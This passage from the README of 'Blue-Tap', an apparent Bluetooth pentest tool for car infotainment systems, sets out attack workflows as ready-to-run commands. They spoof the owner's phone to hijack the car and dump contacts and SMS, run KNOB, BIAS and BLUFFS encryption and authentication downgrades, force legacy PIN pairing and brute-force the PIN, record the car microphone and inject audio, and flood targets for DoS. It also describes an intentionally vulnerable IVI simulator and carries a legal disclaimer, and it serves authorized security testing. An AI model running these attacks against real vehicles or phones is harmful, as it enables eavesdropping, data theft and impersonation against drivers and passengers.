   blue-tap scan classic                        # auto-session created
   blue-tap -s mytest scan classic              # named session
   blue-tap -s mytest vulnscan TARGET           # resume named session
   blue-tap session list                        # see all sessions
   blue-tap report                              # report from latest session

╭─ Options ────────────────────────────────────────────────────────────────────╮
│ --version                     Show the version and exit.                     │
│ --verbose  -v  INTEGER RANGE  Verbosity: -v verbose, -vv debug               │
│ --session  -s  TEXT           Session name (default: auto-generated from     │
│                               date/time). Use to resume a previous session.  │
│ --help                        Show this message and exit.                    │
╰──────────────────────────────────────────────────────────────────────────────╯
╭─ Discovery & Reconnaissance ─────────────────────────────────────────────────╮
│ scan              Discover Bluetooth Classic and BLE devices.                │
│ recon             Service enumeration and device fingerprinting.             │
│ adapter           HCI Bluetooth adapter management.                          │
╰──────────────────────────────────────────────────────────────────────────────╯
╭─ Assessment ─────────────────────────────────────────────────────────────────╮
│ assess     Safe non-destructive security assessment (5-phase).              │
│ vulnscan   Scan target for vulnerabilities and attack-surface indicators.    │
│ fleet      Fleet-wide Bluetooth assessment — scan, classify, assess          │
│            multiple devices.                                                 │
╰──────────────────────────────────────────────────────────────────────────────╯
╭─ Exploitation ───────────────────────────────────────────────────────────────╮
│ hijack               Full IVI hijack: spoof phone identity and extract data.│
│ bias                 BIAS attack — bypass authentication via role-switch     │
│                      (CVE-2020-10135).                                      │
│ knob                 KNOB attack — negotiate minimum encryption key size    │
│                      (CVE-2019-9506).                                       │
│ bluffs               BLUFFS session key downgrade (CVE-2023-24023).         │
│ encryption-downgrade Encryption downgrade beyond KNOB (DarkFirmware).       │
│ ssp-downgrade        SSP downgrade attack — force legacy PIN pairing.       │
│ spoof                MAC address spoofing and device impersonation.          │
╰──────────────────────────────────────────────────────────────────────────────╯
╭─ Data Extraction & Audio ────────────────────────────────────────────────────╮
│ pbap    Phone Book Access Profile - download phonebook and call logs.        │
│ map     Message Access Profile - download SMS/MMS messages.                  │
│ at      AT command data extraction via RFCOMM (bluesnarfer alternative).     │
│ opp     Object Push Profile - push files to IVI.                             │
│ hfp     Hands-Free Profile - call audio interception and injection.          │
│ audio   Audio capture, injection, and eavesdropping via PulseAudio.          │
│ avrcp   AVRCP media control and attacks.                                     │
╰──────────────────────────────────────────────────────────────────────────────╯
╭─ Fuzzing & Stress Testing ───────────────────────────────────────────────────╮
│ fuzz   Protocol fuzzing -- campaign mode, legacy fuzzers, and crash          │
│        management.                                                           │
│ dos    DoS attacks and pairing abuse.                                        │
╰──────────────────────────────────────────────────────────────────────────────╯
╭─ Reporting & Automation ─────────────────────────────────────────────────────╮
│ session   Manage assessment sessions.                                        │
│ report    Generate pentest report from the current session.                  │
│ auto      Full automated pentest: discovery, fingerprint, recon, vulnscan,   │
│           exploit, fuzz, DoS, report.                                        │
│ run       Execute multiple blue-tap commands in sequence.                    │
╰──────────────────────────────────────────────────────────────────────────────╯
```

</details>

### Getting Help for Any Command

```bash
blue-tap <command> --help                   # Group help
blue-tap <command> <subcommand> --help      # Subcommand help

# Examples:
blue-tap fuzz --help                        # Shows all fuzz subcommands
blue-tap fuzz campaign --help               # Campaign options and examples
blue-tap recon --help                       # All recon subcommands
```

---

## Workflows

### Workflow 1: Quick Assessment

Discover, fingerprint, and scan for vulnerabilities in under 5 minutes.

```bash
blue-tap -s quick scan classic
blue-tap -s quick recon fingerprint AA:BB:CC:DD:EE:FF
blue-tap -s quick vulnscan AA:BB:CC:DD:EE:FF
blue-tap -s quick report
```

### Workflow 2: Full Penetration Test (Automated)

Single command runs all 9 phases: discovery, fingerprint, recon, vuln assessment, pairing attacks, exploitation, fuzzing, DoS, and report generation.

```bash
blue-tap -s pentest auto AA:BB:CC:DD:EE:FF
```

Skip phases you don't need:

```bash
blue-tap -s pentest auto AA:BB:CC:DD:EE:FF --skip-fuzz --skip-dos    # Quick: recon + exploit only
blue-tap -s pentest auto AA:BB:CC:DD:EE:FF --fuzz-duration 7200      # 2-hour fuzz instead of 1
```

### Workflow 3: Full Penetration Test (Manual)

Step-by-step with full control over each phase.

```bash
# 1. Discovery
blue-tap -s pentest scan classic
blue-tap -s pentest scan ble

# 2. Reconnaissance
blue-tap -s pentest recon sdp AA:BB:CC:DD:EE:FF
blue-tap -s pentest recon fingerprint AA:BB:CC:DD:EE:FF
blue-tap -s pentest recon rfcomm-scan AA:BB:CC:DD:EE:FF
blue-tap -s pentest recon l2cap-scan AA:BB:CC:DD:EE:FF
blue-tap -s pentest recon gatt AA:BB:CC:DD:EE:FF

# 3. Vulnerability assessment (with active BIAS probe)
blue-tap -s pentest vulnscan AA:BB:CC:DD:EE:FF --active --phone CC:DD:EE:FF:00:11

# 4. Pairing attacks
blue-tap -s pentest ssp-downgrade probe AA:BB:CC:DD:EE:FF
blue-tap -s pentest knob probe AA:BB:CC:DD:EE:FF

# 5. Connection hijack + data extraction
blue-tap -s pentest hijack AA:BB:CC:DD:EE:FF CC:DD:EE:FF:00:11

# 6. Direct data extraction (alternative to hijack)
blue-tap -s pentest pbap dump AA:BB:CC:DD:EE:FF
blue-tap -s pentest map dump AA:BB:CC:DD:EE:FF

# 7. Protocol fuzzing
blue-tap -s pentest fuzz campaign AA:BB:CC:DD:EE:FF \
  -p sdp -p rfcomm -p obex-pbap --duration 1h --capture

# 8. DoS testing
blue-tap -s pentest dos l2cap-storm AA:BB:CC:DD:EE:FF
blue-tap -s pentest dos rfcomm-sabm-flood AA:BB:CC:DD:EE:FF

# 9. Report
blue-tap -s pentest report -f html
```

### Workflow 4: Hijack and Extract

Impersonate the owner's phone, connect to the IVI, and steal data.

```bash
# Find the IVI and nearby phones
blue-tap scan classic

# Enumerate IVI services
blue-tap recon sdp AA:BB:CC:DD:EE:FF
blue-tap recon rfcomm-scan AA:BB:CC:DD:EE:FF

# Hijack — clones phone identity, connects to IVI, dumps PBAP + MAP
blue-tap hijack AA:BB:CC:DD:EE:FF CC:DD:EE:FF:00:11 --phone-name "iPhone"

# Or use BIAS when IVI validates link keys
blue-tap hijack AA:BB:CC:DD:EE:FF CC:DD:EE:FF:00:11 --bias
```

### Workflow 5: Audio Eavesdropping

Record the car's microphone, capture media streams, or inject audio.

```bash
# Switch to HFP profile and record microphone
blue-tap audio profile AA:BB:CC:DD:EE:FF hfp
blue-tap audio record-mic AA:BB:CC:DD:EE:FF -d 120

# Live eavesdrop (car mic → laptop speakers)
blue-tap audio live AA:BB:CC:DD:EE:FF

# Capture A2DP media stream
blue-tap audio profile AA:BB:CC:DD:EE:FF a2dp
blue-tap audio capture AA:BB:CC:DD:EE:FF

# Inject audio through car speakers
blue-tap audio play AA:BB:CC:DD:EE:FF message.wav

# Review all captured audio
blue-tap audio review
```

### Workflow 6: Fuzzing Campaign

Find 0-day vulnerabilities with protocol-aware fuzzing.

```bash
# Generate seed corpus
blue-tap fuzz corpus generate

# Run coverage-guided campaign across multiple protocols
blue-tap -s fuzz fuzz campaign AA:BB:CC:DD:EE:FF \
  -p sdp -p rfcomm -p obex-pbap -p ble-att \
  --strategy coverage --duration 2h --capture

# Review and analyze crashes
blue-tap fuzz crashes list
blue-tap fuzz crashes show 1
blue-tap fuzz minimize 1

# Replay crash to verify reproducibility
blue-tap fuzz crashes replay 1

# Try known CVE patterns
blue-tap fuzz cve AA:BB:CC:DD:EE:FF

# Export and report
blue-tap fuzz crashes export
blue-tap -s fuzz report
```

### Workflow 7: SSP Downgrade + PIN Brute Force

Force a device from Secure Simple Pairing to legacy PIN mode, then brute force the PIN.

```bash
blue-tap ssp-downgrade probe AA:BB:CC:DD:EE:FF
blue-tap ssp-downgrade attack AA:BB:CC:DD:EE:FF --pin-start 0 --pin-end 9999
blue-tap pbap dump AA:BB:CC:DD:EE:FF     # Extract data after pairing
```

### Workflow 8: Playbook Automation

Create a reusable pentest playbook — one command per line, `TARGET` is auto-resolved.

**`ivi-pentest.txt`:**
```
scan classic
recon sdp TARGET
recon fingerprint TARGET
recon rfcomm-scan TARGET
recon l2cap-scan TARGET
vulnscan TARGET
pbap dump TARGET
map dump TARGET
report
```

```bash
blue-tap -s assessment run --playbook ivi-pentest.txt
```

### Workflow 9: BLUFFS + Encryption Downgrade

Test session key and encryption security using DarkFirmware LMP attacks.

```bash
# 1. Probe for BLUFFS vulnerability
blue-tap bluffs AA:BB:CC:DD:EE:FF -v probe -i hci1

# 2. If vulnerable, attempt session key downgrade
blue-tap bluffs AA:BB:CC:DD:EE:FF -v sc-downgrade -i hci1
blue-tap bluffs AA:BB:CC:DD:EE:FF -v key-downgrade -i hci1

# 3. Test encryption downgrade paths
blue-tap encryption-downgrade AA:BB:CC:DD:EE:FF -m all -i hci1

# 4. Generate report
blue-tap report
```

---

## Vulnerable IVI Simulator

Blue-Tap ships with a companion **Vulnerable IVI Simulator** in the `target/` directory. This is a real Bluetooth target (not a mock) that runs on any Linux machine with a Bluetooth adapter and behaves like an intentionally vulnerable car infotainment system.

### Purpose

- Practice Blue-Tap commands against a real target
- Demonstrate all attack vectors in a controlled environment
- Validate tool functionality without access to a real vehicle

### Quick Setup

Requires a **separate Linux machine** (Kali laptop, Raspberry Pi, or desktop with Bluetooth adapter).

```bash
# Terminal 1 — Configure adapter
cd target/
sudo ./setup_ivi.sh

# Terminal 2 — Start pairing agent
sudo python3 pin_agent.py

# Terminal 3 — Start IVI daemon
sudo python3 ivi_daemon.py

# Optional Terminal 4 — BLE GATT server
sudo python3 ble_gatt.py
```

### Exposed Services

| Service | Channel/PSM | Data |
|---------|-------------|------|
| PBAP (Phonebook) | RFCOMM 15 | 50 contacts, call history |
| MAP (Messages) | RFCOMM 16 | 20 SMS messages |
| OPP (Object Push) | RFCOMM 9 | Accepts any file |
| HFP (Hands-Free) | RFCOMM 10 | Full SLC handshake |
| SPP (Serial Port) | RFCOMM 1 | AT command responder |
| Hidden Debug | RFCOMM 2 | Not in SDP |
| BNEP (PAN) | L2CAP 7 | Fuzz absorber |
| AVCTP (AVRCP) | L2CAP 23 | Fuzz absorber |
| AVDTP (A2DP) | L2CAP 25 | Fuzz absorber |
| BLE GATT | Multiple | Device Info + Battery + Custom IVI |

### Built-in Vulnerabilities

| Vulnerability | What Blue-Tap Command Finds It |
|---------------|-------------------------------|
| Unauthenticated OBEX | `blue-tap vulnscan` → CRITICAL |
| Legacy PIN "1234" | `blue-tap dos pin-brute` |
| Just Works pairing (SSP) | `blue-tap vulnscan` → HIGH |
| No PIN rate limiting | `blue-tap vulnscan` → MEDIUM |
| Hidden RFCOMM channel | `blue-tap vulnscan` → MEDIUM |
| Permissive AT commands | `blue-tap at connect` |
| Unauthenticated BLE writes | `blue-tap recon gatt` |
| Hijack-vulnerable bond | `blue-tap hijack` |

See [`target/README.md`](target/README.md) for detailed setup instructions, architecture diagrams, and platform-specific notes.

---

## Troubleshooting

### Adapter Issues

**"No adapters found" / "Adapter not found"**
```bash
# Check if adapter exists
hciconfig -a

# If rfkill is blocking
rfkill list bluetooth
rfkill unblock bluetooth

# If USB dongle not recognized
lsusb | grep -i bluetooth

# Bring adapter up manually
sudo hciconfig hci0 up
```

**"Operation not permitted"**
```bash
# Most Blue-Tap commands require root
sudo blue-tap scan classic

# Or set capabilities (alternative to sudo)
sudo setcap cap_net_raw,cap_net_admin+eip $(which python3)
```

### Scanning Issues

**"No devices found"**
- Ensure target is discoverable (`hciconfig hci0 | grep PSCAN` on target)
- Increase scan duration: `blue-tap scan classic -d 30`
- Try from closer range (Bluetooth range ~10m)
- Check for RF interference

**BLE scan shows no results**
- Ensure BLE is enabled: `sudo btmgmt le on`
- Try passive mode: `blue-tap scan ble --passive`
- Some adapters need LE explicitly enabled in btmgmt

### Connection Issues

**"Connection refused" on RFCOMM**
- Target service may require pairing first
- Check if the channel is correct: `blue-tap recon rfcomm-scan <MAC>`
- Service may have been deregistered

**"Permission denied" on L2CAP**
- L2CAP PSMs below 4096 require root: `sudo blue-tap ...`
- Check if PSM is blocked by the kernel: `cat /proc/sys/net/bluetooth/l2cap_enable_ertm`

**Pairing failures**
- Check pairing mode: `blue-tap recon pairing-mode <MAC>`
- For SSP devices, PIN brute-force won't work
- Try `blue-tap recon ssp <MAC>` to verify

### SDP Issues

**"Failed to connect to SDP server"**
```bash
# Enable BlueZ compatibility mode
sudo sed -i 's|ExecStart=.*/bluetoothd|& --compat|' /lib/systemd/system/bluetooth.service
sudo systemctl daemon-reload
sudo systemctl restart bluetooth
```

### Fuzzing Issues

**"scapy not found"**
```bash
# Install fuzzing dependencies
pip install -e ".[fuzz]"
# or
pip install scapy>=2.5
```

**"No crash database found"**
- Run a fuzz campaign first to create the database
- Specify session: `blue-tap fuzz crashes list -s <session_name>`

**Target becomes unresponsive during fuzzing**
- Increase `--delay` between test cases: `--delay 2.0`
- Increase `--cooldown` after crash: `--cooldown 10`
- Reduce iteration rate with `--timeout 5`
- The target's Bluetooth stack may need manual restart

### Audio Issues

**"PulseAudio: connection refused"**
```bash
# Check PulseAudio/PipeWire is running
pactl info

# Restart audio service
blue-tap audio restart

# Diagnose Bluetooth audio routing
blue-tap audio diagnose <MAC>
```

**No audio sources/sinks visible**
```bash
blue-tap audio devices
# If empty: pair the device first, then switch profile
blue-tap audio profile <MAC> a2dp   # or hfp
```

### MAC Spoofing Issues

**"bdaddr not found"**
```bash
# Install bdaddr (part of bluez-tools or build from source)
sudo apt install bluez-tools
# or
# Build bdaddr from BlueZ source
```

**"Cannot change MAC" / "Operation not supported"**
- Intel adapters typically do not support MAC spoofing
- Use a CSR8510 or BCM20702 USB dongle
- Some adapters require the interface to be down: `sudo hciconfig hci0 down` before spoofing

### Report Issues

**"No session data found"**
- Ensure you used `-s` flag consistently: `blue-tap -s mytest scan classic`
- Check session exists: `blue-tap session list`
- Point to specific directory: `blue-tap report ./my_output_dir/`

---

## Platform Notes

### Kali Linux (Recommended)

- All tools pre-installed (BlueZ, hcitool, sdptool, btmgmt, bluetoothctl)
- May need `--compat` flag for bluetoothd
- Use an external USB adapter (CSR8510/BCM20702) for full feature access

### Ubuntu / Debian

```bash
sudo apt install -y bluez bluez-tools python3-pip python3-dev python3-venv libbluetooth-dev
```


---

## License

Blue-Tap is licensed under the **GNU General Public License v3.0** — see the [LICENSE](LICENSE) file for details.

Copyright (C) 2026 Santhosh Ballikonda

This program is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.

---

## Credits and References

Blue-Tap builds on published academic research and open-source tools. Credit to the researchers whose work made these attacks possible:

### Research Papers

| Attack | Paper | Authors | Venue |
|--------|-------|---------|-------|
| **BLUFFS** | "BLUFFS: Bluetooth Forward and Future Secrecy Attacks and Defenses" | Daniele Antonioli | ACM CCS 2023 |
| **KNOB** | "The KNOB is Broken: Exploiting Low Entropy in the Encryption Key Negotiation of Bluetooth BR/EDR" | Daniele Antonioli, Nils Ole Tippenhauer, Kasper Rasmussen | USENIX Security 2019 |
| **BIAS** | "BIAS: Bluetooth Impersonation AttackS" | Daniele Antonioli, Nils Ole Tippenhauer, Kasper Rasmussen | IEEE S&P 2020 |
| **BrakTooth** | "BrakTooth: Causing Havoc on Bluetooth Link Manager via Directed Fuzzing" | Matheus E. Garbelini et al. | USENIX Security 2022 |
| **SweynTooth** | "SweynTooth: Unleashing Mayhem over Bluetooth Low Energy" | Matheus E. Garbelini et al. | USENIX ATC 2020 |
| **AFLNet** | "AFLNet: A Greybox Fuzzer for Network Protocols" | Van-Thuan Pham et al. | ICST 2020 |
| **Invalid Curve** | "Invalid Curve Attack on Bluetooth Secure Simple Pairing" | Eli Biham, Lior Neumann | — |
| **BlueBorne** | "BlueBorne: A New Attack Vector" | Ben Seri, Gregory Vishnepolsky | Armis Labs 2017 |
| **PerfektBlue** | "PerfektBlue: Bluetooth Vulnerabilities in OpenSynergy BlueSDK" | — | 2024 |

### Tools and Firmware

| Tool | Purpose | Credit |
|------|---------|--------|
| [DarkFirmware](https://github.com/darkmentorllc/DarkFirmware_real_i) | RTL8761B firmware patching for LMP injection/monitoring | darkmentorllc |
| [BlueZ](http://www.bluez.org/) | Linux Bluetooth protocol stack | BlueZ contributors |
| [Bleak](https://github.com/hbldh/bleak) | BLE GATT client library | Henrik Blidh |
| [InternalBlue](https://github.com/seemoo-lab/internalblue) | Broadcom/Cypress Bluetooth firmware tools | SEEMOO Lab, TU Darmstadt |
| [Crackle](https://github.com/mikeryan/crackle) | BLE pairing key cracking | Mike Ryan |

---

## Legal Disclaimer

Blue-Tap is provided for **authorized security testing and research purposes only**.

- You **must** have explicit written permission from the owner of any device you test
- Unauthorized access to Bluetooth devices is illegal under the Computer Fraud and Abuse Act (CFAA), the UK Computer Misuse Act, and similar laws worldwide
- The authors accept no liability for misuse of this tool
- Always follow your organization's rules of engagement and scope limitations
- Report vulnerabilities responsibly to the affected manufacturer

**Responsible disclosure:** If you discover vulnerabilities in production IVI systems using Blue-Tap, follow coordinated disclosure practices. Contact the vehicle manufacturer's PSIRT (Product Security Incident Response Team) before public disclosure.

---

## Author

**Santhosh Ballikonda** — [@Indspl0it](https://github.com/Indspl0it)
